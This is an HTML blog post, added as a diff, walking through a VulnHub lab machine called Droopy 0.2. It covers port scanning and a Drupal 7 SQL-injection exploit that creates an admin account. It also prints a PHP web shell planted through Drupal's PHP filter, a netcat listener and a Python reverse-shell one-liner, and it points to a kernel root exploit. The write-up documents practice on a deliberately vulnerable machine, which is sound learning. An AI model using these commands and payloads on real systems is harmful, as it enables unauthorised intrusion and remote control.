@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>John Tuyen | Droopy 0.2</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Droopy 0.2"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/vulnhub-droopy02/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Droopy 0.2" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gallery/ ">Gallery</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">07</span>
+        <span class="rest">Feb 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Droopy 0.2 </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>Initiated nmap scans using my own custom scripts.</p>
+</li>
+<li>
+<p>Port 80 is opened and running Drupal 7. <code>robots.txt</code> shows a lot of disallowed listings.</p>
+<ul>
+<li>
+<p>After enumerating the disallowed list, I found out drupal 7.30 is installed.</p>
+</li>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a> - Drupal SQL injection to create administrator credentials</p>
+</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">cp</span><span> /usr/share/exploitdb/exploits/php/webapps/34992.py ./
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">python</span><span> 34992.py http://droopy</span><span style="color:#bf616a;"> -u</span><span> admin1</span><span style="color:#bf616a;"> -p</span><span> admin1
+</span></code></pre>
+<ul>
+<li>It found the site was vulnerable and created account. Using account as &quot;admin&quot; doesn't work as it says you need to active or it's a blocked account.</li>
+</ul>
+</li>
+<li>
+<p>Continuing enumeration process:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">nikto -h</span><span> droopy
+</span></code></pre>
+<ul>
+<li>
+<p><a href="http://droopy/info.php">http://droopy/info.php</a></p>
+</li>
+<li>
+<p>Ubuntu Linux 3.13.0-43-generic</p>
+</li>
+<li>
+<p>Apache 2.4.7</p>
+</li>
+<li>
+<p>PHP/5.5.9-1ubuntu4.5</p>
+</li>
+<li>
+<p><code>nikto</code> also shows that the page can be exploited by Remote File Inclusion (RFI).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Rabbit hole</strong> - There was a lot of research of UDP and TCP ports and testing out possible exploits. This is a bad rabbit hole to fall into.</p>
+</li>
+<li>
+<p>There was a lot of trial and error at this point for me. I was digging through on how I would execute php files but had no luck with the default uploading forms. When I tried uploading a php file, it would auto rename to txt format. I had tried Googling how you would bypass this mechanism but it's a setting that you will need to edit through CLI. After spending a couple of hours, I took a peak at a walkthrough on how you would perform RFI.</p>
+</li>
+<li>
+<p>In the control panel, go to <code>Modules</code> and enable <code>PHP filter</code>.</p>
+</li>
+<li>
+<p>Once enabled, configure modify two PHP filter permissions to allow PHP code text format option and for settings.</p>
+</li>
+<li>
+<p>Create a new &quot;Block&quot; page and add the RFI code in the body:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">pre</span><span>&gt;&lt;?php system($_GET[&#39;c&#39;]) ?&gt;&lt;/</span><span style="color:#bf616a;">pre</span><span>&gt;
+</span></code></pre>
+</li>
+<li>
+<p>Setup netcat:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">nc -nvlp</span><span> 1234
+</span></code></pre>
+</li>
+<li>
+<p>Execute python reverse shell one liner:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">droopy/index.php?c</span><span>=</span><span style="color:#a3be8c;">python </span><span style="color:#bf616a;">-c </span><span>&#39;</span><span style="color:#a3be8c;">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.242.2.3&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><span>&#39;
+</span></code></pre>
+</li>
+<li>
+<p>Initiated enumeration process for privesc.</p>
+<ul>
+<li><code>linuxprivchecker.py</code> showed interesting mail data at <code>/var/mail/www-data</code> hinting something about <code>rockyou.txt</code>.</li>
+</ul>
+</li>
+<li>
+<p>Performed exploit for linux kernel 3.13.0 - <a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a></p>
+</li>
+<li>
+<p>ROOTED!</p>
+</li>
+</ol>
+<h3 id="today-i-learned">Today I learned</h3>
+<ul>
+<li>In step 7, notice that the variable &quot;c&quot; is important. When you execute the RFI URL, you need to have &quot;c&quot; as the variable after the php file so for example <code>http://droopy/index.php?c=pwd</code></li>
+</ul>
+<h3 id="improvement-for-next-time">Improvement for next time</h3>
+<ul>
+<li>
+<p>I did have a hunch that if it didn't run my php code natively after creating a page, I should have looked into how you would enable the PHP feature. It was infront of my face but didn't carry though with the task.</p>
+</li>
+<li>
+<p>I tried even using the PDF header trick to pass on a php file but that was useless.</p>
+</li>
+<li>
+<p>What I really got sidetracked was not fully understanding how RFI works. The part where you have to craft a URL to trigger the RFI.</p>
+</li>
+</ul>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/vulnhub'>vulnhub</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
